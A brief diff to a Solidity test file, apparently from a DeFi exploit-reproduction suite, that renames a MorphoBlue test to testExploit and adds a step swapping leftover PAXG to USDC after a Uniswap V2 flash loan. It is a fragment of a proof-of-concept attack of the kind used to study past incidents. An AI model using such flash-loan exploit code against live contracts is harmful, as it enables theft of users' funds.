@@ -297,9 +297,12 @@ contract MorphoBlue is BaseTestWithBalanceLog {
         fundingToken = USDC;
     }
 
-    function testCase() public balanceLog {
+    function testExploit() public balanceLog {
         // Initiate a flash loan of PAXG from the Uniswap V2 pair
         IUniswapV2Pair(PAXG_WETH_V2_PAIR).swap(PAXG_FLASHLOAN_AMOUNT, 0, address(this), new bytes(100));
+        //At the end we swap any PAXG if remaining to USDC
+        uint paxgBal = TokenHelper.getTokenBalance(PAXG,address(this));
+        if(paxgBal > 0) {_v3Swap(PAXG,USDC,paxgBal,address(this));}
     }
 
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
